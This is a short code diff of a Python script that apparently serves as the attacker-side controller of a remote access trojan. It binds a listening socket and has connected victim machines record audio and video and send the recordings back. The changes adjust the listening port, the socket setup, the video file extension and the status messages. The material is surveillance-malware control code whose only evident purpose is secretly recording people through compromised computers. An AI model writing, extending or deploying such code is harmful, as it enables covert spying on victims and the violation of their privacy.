@@ -23,8 +23,8 @@ def socket_create():
 		global port
 		global s
 		host = ''
-		port = 4444
-		s = socket.socket()
+		port = 1234 
+		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 	except socket.error as msg:
 		print("Socket Creation Error: " + str(msg))
 
@@ -358,16 +358,17 @@ def voice_record(cmd,conn):
 	print(client_response, end='')
 
 def video_record(cmd,conn):
-	file_Name = 'VideoRecord.wav'
+	file_Name = 'VideoRecord.avi'
 	duration = cmd[10:]
 	conn.send(str.encode(cmd))
+
+	print()
+	print('  [!] VIDEO RECORD')
+	print('  [!] Recording, Please wait for: ' + duration + ' sec')
 
 	client_response = str(conn.recv(20480), 'utf-8')
 	if client_response == 'VIDEO_RECORDING':
 
-		print()
-		print('  [!] VIDEO RECORD')
-		print('  [!] Recording, Please wait for: ' + duration + ' sec')
 		f = open(file_Name, 'wb')
 		file_Size = str(conn.recv(1024), 'utf-8')
 
@@ -389,7 +390,7 @@ def video_record(cmd,conn):
 
 	else:
 		print()
-		print('  [!] VIDEO RECORD FAILED: ' + client_response )
+		print('  [!] VIDEO RECORD FAILED')
 		print('  [*] Please Try Again') 
 		print()
 	
